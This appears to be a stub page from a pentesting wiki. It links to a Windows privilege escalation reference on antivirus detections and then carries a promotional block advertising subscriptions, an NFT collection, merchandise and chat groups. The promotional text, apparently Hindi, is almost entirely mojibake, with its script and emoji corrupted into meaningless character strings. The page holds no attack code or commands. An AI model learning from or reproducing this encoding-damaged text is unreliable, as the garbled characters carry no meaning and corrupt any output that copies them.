[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рдХреА рдЬрд╛рдП? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣,
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рд╣рдореЗрдВ PR рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
